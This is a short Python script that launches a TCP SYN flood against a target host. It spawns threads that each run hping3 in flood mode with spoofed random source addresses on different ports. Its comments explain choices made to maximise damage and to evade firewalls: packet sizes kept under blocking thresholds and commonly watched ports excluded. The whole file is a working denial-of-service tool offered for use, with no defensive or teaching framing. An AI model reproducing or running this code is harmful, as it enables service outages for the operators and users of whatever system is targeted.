"""This script sends TCP SYN packets to a target host, it doesn't finish connection and wastes target's resources"""

import subprocess
import time
import random
import threading


"""This script was made using Linux hping3 application
and carefully crafting SYN packets for it. I tried to make
them to be hard to detect by a firewall"""


used_ports = []
threads = []
is_running = True

def send_tcp(ip):
    #first I made sure that every thread is sending packets on different port
    port = confirm_port()

    #packet size was also chose so it would make more damage, but didn't face possibility of being automatically blocked
    #I chose 1400 because 1500 is limit for ethernet fragmentation and there could also be risk of it being blocked
    pckt_size = random.randint(1000, 1400)

    #the last argument is random source which sends every packet from different IP making it harder to detect
    result = subprocess.Popen(["hping3", ip, "-S", "--flood", "--rand-source", "-p", str(port),"--data", str(pckt_size)],
                              stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

    while is_running:
        pass

    result.terminate()

    try:
        stdout, stderr = result.communicate(timeout=2)
    except subprocess.TimeoutExpired:
        result.kill()
        stdout, stderr = result.communicate()

def run_threads(ip, num_threads):
    #creates given amount of threads to run the attack
    for i in range(num_threads):
        t = threading.Thread(target=send_tcp, args=(ip,))
        threads.append(t)
        t.start()

def confirm_port():
    #I used these ports to avoid the most watched ports on network
    port = random.randint(1025, 49151)
    #exclusion of the most commonly blocked ports in my set-up range
    commonly_blocked = {1433, 1720, 3306, 3389, 4662, 5060, 5061, 5900, 6881, 6882,
                        6883, 6884, 6885, 6886, 6887, 6888, 6889, 8080, 8443}
    while port in used_ports or port in commonly_blocked:
        port = random.randint(1025, 49151)
    used_ports.append(port)
    return port

def stop_attack():
    global is_running
    is_running = False

    for t in threads:
        t.join()